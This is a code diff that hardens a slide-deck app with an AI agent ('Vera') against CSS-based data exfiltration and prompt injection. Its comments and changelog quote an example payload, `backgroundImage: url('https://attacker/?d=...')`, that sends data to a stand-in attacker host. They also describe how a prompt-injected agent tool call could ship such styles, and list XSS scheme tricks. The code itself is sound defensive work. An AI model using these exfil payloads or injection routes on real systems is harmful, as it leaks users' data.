@@ -69,8 +69,9 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.49";
+const VELA_VERSION = "12.50";
 const VELA_CHANGELOG = [
+  { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) LOAD_LANES reducer now re-sanitizes every slide via sanitizeSlide — Vera's 20-tool ReAct writes (set_slides/add_slide/edit_slide) round-trip through LOAD_LANES, the only ingest path that previously skipped sanitization. (H2) New sanitizeStyle() + SAFE_STYLE_KEYS allowlist: block.style and item.style were typecheck-only, allowing `backgroundImage: url('https://attacker/?d=...')` as a zero-click CSS exfil channel with no CSP backstop inside the artifact srcdoc. Allowlist excludes image-loading keys (background, backgroundImage, borderImage, listStyleImage, cursor, content, mask, filter, font shorthand) and rejects any value containing url()/expression()/image-set()/CSS-escape/angle-bracket even when the key is allowlisted. (H5) ReAct loop now caps tool_calls/turn (16), session-total tools (40), and cumulative messages payload (200 KB) to prevent prompt-injection cost-amplification DoS." },
   { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage. Added 10 CI-gating source assertions (SVG_BLOCKED_TAGS + SMIL family, CDATA/comment node strip, control-char scheme normalization, lane clamp-not-throw, fail-closed deck-load fallbacks, IMPORT_CONCEPTS sanitizeSlide, openExternalLink sink + no raw window.open of deck links, item-level link sanitization) and new in-browser uitest cases (entity-encoded javascript: schemes, tag reconstruction, unclosed iframe/embed/script/foreignObject, vbscript via xlink:href, and a Deck Sanitization suite covering >50-lane clamp + non-whitelisted block drop)." },
   { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in SVG_BLOCKED_TAGS — added animateTransform, animateMotion, animateColor and mpath alongside the existing animate/set. Their on* event handlers were already stripped (so they were inert, not exploitable), but removing the elements outright eliminates any residual SMIL animation surface (e.g. animating an attribute toward a dangerous value) and matches the treatment of <animate>. Static presentation diagrams don't use SMIL." },
   { v: "12.47", d: "Security (High): fix fail-open deck sanitization. validateAndSanitizeDeck() threw on >50 lanes, and three callers (applyStartupPatch, the serve.py local-sync push, and the merge dialog) caught the throw and dispatched the RAW unsanitized deck — so the lane limit doubled as a sanitizer off-switch (unsanitized style/clickjacking overlays, non-whitelisted blocks, oversized payloads reached render state). Now: (1) the lane count is clamped via slice(0,50) instead of thrown, removing the weaponizable trigger, and (2) all three fallbacks fail closed — they log and skip instead of loading raw. Also sanitize IMPORT_CONCEPTS slides in the reducer (chat-paste {concepts:[…]} / bare-array path previously bypassed validateAndSanitizeDeck)." },
@@ -386,6 +387,49 @@ function sanitizeSvgMarkup(raw) {
   } catch (_) { return ""; }
 }
 
+// SECURITY (audit 2025-05, H2): block.style was previously typecheck-only,
+// which let a deck (or a Vera prompt-injected tool call) ship CSS values
+// like `backgroundImage: url('https://attacker/?d=...')`. Inline styles
+// fire an outbound GET on every render with no CSP backstop inside the
+// artifact srcdoc — a zero-click data-exfil channel. We now apply both an
+// allowlist of safe CSS keys (text/layout/color, no image-loading) AND a
+// value filter that rejects url() / expression() / image-set() / CSS
+// escapes / angle brackets, even on allowlisted keys.
+const SAFE_STYLE_KEYS = new Set([
+  // text
+  "color", "fontWeight", "fontStyle", "fontSize", "fontFamily",
+  "letterSpacing", "lineHeight", "textAlign", "textTransform",
+  "textDecoration", "whiteSpace", "wordBreak", "overflowWrap",
+  // layout
+  "display", "flexDirection", "alignItems", "justifyContent", "gap",
+  "padding", "paddingTop", "paddingRight", "paddingBottom", "paddingLeft",
+  "margin", "marginTop", "marginRight", "marginBottom", "marginLeft",
+  "width", "height", "minWidth", "minHeight", "maxWidth", "maxHeight",
+  "boxSizing", "flex", "flexGrow", "flexShrink", "flexBasis", "flexWrap",
+  "gridTemplateColumns", "gridTemplateRows", "gridColumn", "gridRow",
+  // box
+  "backgroundColor", "borderRadius",
+  "borderTop", "borderRight", "borderBottom", "borderLeft",
+  "borderColor", "borderStyle", "borderWidth",
+  "boxShadow", "opacity",
+]);
+const STYLE_VALUE_REJECT = /url\s*\(|expression\s*\(|image-set\s*\(|<|\\/i;
+function sanitizeStyle(style) {
+  if (!style || typeof style !== "object" || Array.isArray(style)) return undefined;
+  const out = {};
+  for (const k of Object.keys(style)) {
+    if (!SAFE_STYLE_KEYS.has(k)) continue;
+    const v = style[k];
+    if (typeof v === "number" && Number.isFinite(v)) { out[k] = v; continue; }
+    if (typeof v === "string") {
+      if (v.length > 200) continue;
+      if (STYLE_VALUE_REJECT.test(v)) continue;
+      out[k] = v;
+    }
+  }
+  return out;
+}
+
 function sanitizeBlock(block) {
   if (!block || typeof block !== "object" || Array.isArray(block)) return null;
   if (!SAFE_BLOCK_TYPES.has(block.type)) return null;
@@ -466,12 +510,21 @@ function sanitizeBlock(block) {
     // in href/xlink:href survived it, yielding stored XSS on click.
     clean.markup = typeof clean.markup === "string" ? sanitizeSvgMarkup(clean.markup.slice(0, 50000)) : "";
   }
-  // Guard: style must be a plain object, never an array or primitive
-  if (clean.style && (typeof clean.style !== "object" || Array.isArray(clean.style))) delete clean.style;
+  // Guard: style must be allowlisted CSS keys with non-url values — see
+  // sanitizeStyle (audit 2025-05, H2 CSS-exfil fix).
+  if ("style" in clean) {
+    const s = sanitizeStyle(clean.style);
+    if (s && Object.keys(s).length) clean.style = s;
+    else delete clean.style;
+  }
   if (Array.isArray(clean.items)) {
     clean.items = clean.items.map(it => {
-      if (it && typeof it === "object" && it.style && (typeof it.style !== "object" || Array.isArray(it.style))) {
-        const c = { ...it }; delete c.style; return c;
+      if (it && typeof it === "object" && "style" in it) {
+        const s = sanitizeStyle(it.style);
+        const c = { ...it };
+        if (s && Object.keys(s).length) c.style = s;
+        else delete c.style;
+        return c;
       }
       return it;
     });
